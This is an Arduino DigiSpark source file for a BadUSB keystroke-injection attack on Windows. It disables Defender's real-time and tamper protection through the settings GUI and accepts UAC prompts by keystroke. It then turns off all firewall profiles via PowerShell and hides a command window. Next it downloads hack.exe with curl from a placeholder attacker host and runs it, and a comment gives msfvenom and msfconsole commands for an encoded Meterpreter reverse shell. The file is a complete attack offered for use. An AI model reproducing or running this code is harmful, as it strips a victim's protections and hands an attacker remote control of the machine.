/*

Other Ducky Scripts that disables windows defender either gets blocked by tamper protection, or gets mislead by other errors causing them failing to disable real time protection,
however, this script goes to tamper protection settings GUI directly and disables real time protection and tamper protection.

if real time protection is enabled, this script has 100% chance of disabling it

Credits: JM Sanchez
https://www.facebook.com/p4wn3d.phtml
*/


#include "DigiKeyboard.h"

#define KEY_ESC      41
#define KEY_TAB      43
#define KEY_F4       61
#define KEY_DOWN     0x51 

void setup() {
  pinMode(1, OUTPUT);
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_I, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("tamper protection");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_DOWN);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_SPACE); // Turn off real time protection
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT); // BYPASS UAC
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_SPACE); // turn off tamper protection
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT); // BYPASS UAC

  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT); // close the current window
  DigiKeyboard.delay(300); 
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);

  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("cmd /k mode con: cols=15 lines=1"); // make very smol window
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_SHIFT_LEFT | MOD_CONTROL_LEFT); // run as admin
  DigiKeyboard.delay(4000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT); // UAC BYPASS
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
  DigiKeyboard.sendKeyStroke(KEY_M); //goto Move
  for(int i =0; i < 100; i++) // move the small cmd window to the bottom of desktop
    {
      DigiKeyboard.sendKeyStroke(KEY_DOWN);
    }
  DigiKeyboard.delay(400);
  // turns off real time protection, just in case that the victim has disabled this on purpose causing the ducky to enable this feature by accident
  DigiKeyboard.println("powershell Set-MpPreference -DisableRealtimeMonitoring $true");
  DigiKeyboard.delay(400);
  DigiKeyboard.println("powershell Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False");
  DigiKeyboard.delay(100);
  
  /*
  
  In my Kali Linux, I used msfvenom to make my reverse shell payload. The specific payload I used is windows/meterpreter/reverse_tcp
  
  $ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=eth0 lport=4444 -e x86/shikata_ga_nai -i 9 -b '\x00' -f exe -o hack.exe
  $ sudo cp hack.exe /var/www/html/hack.exe
  $ sudo service apache2 start
  $ msfconsole
  $ use multi/handler
  $ set payload windows/meterpreter/reverse_tcp
  $ set LHOST eth0
  $ run

  
  */
  
  DigiKeyboard.println("curl http://ATTACKER_IP/hack.exe --output hack.exe"); //change the address to the address/domain where your payload is located
  DigiKeyboard.delay(1500);
  DigiKeyboard.println(".\\hack");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("exit");

  while(true){
    digitalWrite(1, HIGH); //Turn on LED Light
    delay(500);
    digitalWrite(1, LOW);
    delay(500);
  }
  for(;;){} // stop process from looping

}
